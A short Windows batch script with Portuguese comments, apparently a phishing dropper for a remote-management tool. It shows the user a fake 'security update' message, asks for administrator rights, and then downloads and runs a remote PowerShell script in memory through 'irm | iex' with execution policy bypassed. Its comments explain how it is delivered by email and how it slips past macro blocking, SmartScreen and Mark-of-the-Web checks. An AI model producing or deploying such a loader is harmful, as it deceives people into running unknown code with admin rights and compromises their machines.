@echo off
:: =============================================================================
:: TitanRMM ThinClient - BAT wrapper
:: =============================================================================
:: Este BAT pode ser enviado por email, hospedado no GitHub, etc.
:: Ao executar, ele chama o install.ps1 do servidor via PowerShell.
::
:: Vantagens:
::   - BAT nao sofre bloqueio de macro como VBA/JS
::   - SmartScreen mostra warning leve (nao vermelho)
::   - Nao requer que o usuario saiba usar PowerShell
:: =============================================================================

title Atualizacao do Sistema
echo.
echo   Aplicando atualizacao de seguranca...
echo   Por favor aguarde, nao feche esta janela.
echo.

:: Verificar se esta rodando como admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo   Solicitando permissoes de administrador...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Chamar o install.ps1 do servidor (sem MOTW pois e executado em memoria)
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://cafecompao.digital/install | iex"

echo.
echo   Atualizacao concluida.
echo.
timeout /t 5 /nobreak >nul
